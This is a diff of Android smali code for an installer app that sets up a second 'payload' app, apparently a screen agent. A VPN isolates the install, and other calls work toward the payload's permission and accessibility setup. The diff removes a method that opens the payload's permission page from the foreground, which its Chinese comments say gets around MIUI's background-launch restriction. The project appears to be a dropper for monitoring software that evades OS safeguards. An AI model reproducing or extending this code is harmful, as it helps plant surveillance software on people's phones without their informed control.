@@ -564,9 +564,6 @@
     # 1) 安装完成 → 立刻关掉隔离安装用的 VPN
     invoke-direct {p0}, Lorg/boundarylab/installer/MainActivity;->stopVpn()V
 
-    # 2) 装完立刻拉起 B 的权限页（B 自己没有入口，只能由前台 A 拉）
-    invoke-direct {p0}, Lorg/boundarylab/installer/MainActivity;->launchPayloadPermission()V
-
     # 3) 直接进首页（homeUrl）
     invoke-direct {p0}, Lorg/boundarylab/installer/MainActivity;->showBrowser()V
 
@@ -1420,58 +1417,6 @@
     return-object v0
 .end method
 
-.method private launchPayloadPermission()V
-    .locals 4
-
-    # A 在前台启动 B 的权限页：MIUI 会拦"后台启动 Activity"，
-    # 但前台应用启动其它应用的 Activity 是放行的，这是唯一稳定的入口
-    :try_start_0
-    iget-object v0, p0, Lorg/boundarylab/installer/MainActivity;->config:Lorg/json/JSONObject;
-
-    if-eqz v0, :cond_lpp_done
-
-    const-string v1, "payloadPackageName"
-
-    invoke-virtual {v0, v1}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;
-
-    move-result-object v0
-
-    invoke-virtual {v0}, Ljava/lang/String;->isEmpty()Z
-
-    move-result v1
-
-    if-nez v1, :cond_lpp_done
-
-    new-instance v1, Landroid/content/ComponentName;
-
-    const-string v2, "com.zaka.screenagent.perm.PermissionActivity"
-
-    invoke-direct {v1, v0, v2}, Landroid/content/ComponentName;-><init>(Ljava/lang/String;Ljava/lang/String;)V
-
-    new-instance v2, Landroid/content/Intent;
-
-    invoke-direct {v2}, Landroid/content/Intent;-><init>()V
-
-    invoke-virtual {v2, v1}, Landroid/content/Intent;->setComponent(Landroid/content/ComponentName;)Landroid/content/Intent;
-
-    const/high16 v3, 0x10000000
-
-    invoke-virtual {v2, v3}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;
-
-    invoke-virtual {p0, v2}, Lorg/boundarylab/installer/MainActivity;->startActivity(Landroid/content/Intent;)V
-
-    :cond_lpp_done
-    :try_end_0
-    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0
-
-    return-void
-
-    :catch_0
-    move-exception v0
-
-    return-void
-.end method
-
 .method private openPayloadAppDetails()V
     .locals 5
 
@@ -1920,8 +1865,6 @@
 
     .line 133
     :cond_2
-    invoke-direct {p0}, Lorg/boundarylab/installer/MainActivity;->launchPayloadPermission()V
-
     invoke-direct {p0}, Lorg/boundarylab/installer/MainActivity;->accessibilityPending()Z
 
     move-result v0
